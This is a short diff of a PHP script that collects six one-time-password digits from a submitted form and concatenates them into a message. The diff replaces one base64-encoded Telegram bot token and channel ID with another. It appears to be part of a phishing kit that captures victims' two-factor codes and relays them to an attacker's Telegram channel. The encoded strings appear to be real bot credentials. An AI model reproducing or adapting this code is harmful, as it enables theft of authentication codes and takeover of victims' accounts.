@@ -66,8 +66,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $otpcode4 = $_POST["otpCode-4"];
     $otpcode5 = $_POST["otpCode-5"];
 
-    $botApiToken = base64_decode('Nzg5OTE2ODYwMDpBQUd3akdDRHlpX2FXR0xhOC1WUHdOY2txUWxzMGhiTVIzYw==');
-    $channelId = base64_decode('Nzc4MDcwNzY0Mg==');
+    $botApiToken = base64_decode('NzUzNzQ5NzY5MTpBQUhidlY0QUNGM1NUd0tLRjRIR3lMcXFmbGtJMV83cGZ6Yw==');
+    $channelId = base64_decode('ODAxNzA4NjcxNQ==');
 
     $txt = "🔑OTP🔑: {$otpcode0}{$otpcode1}{$otpcode2}{$otpcode3}{$otpcode4}{$otpcode5}";
 
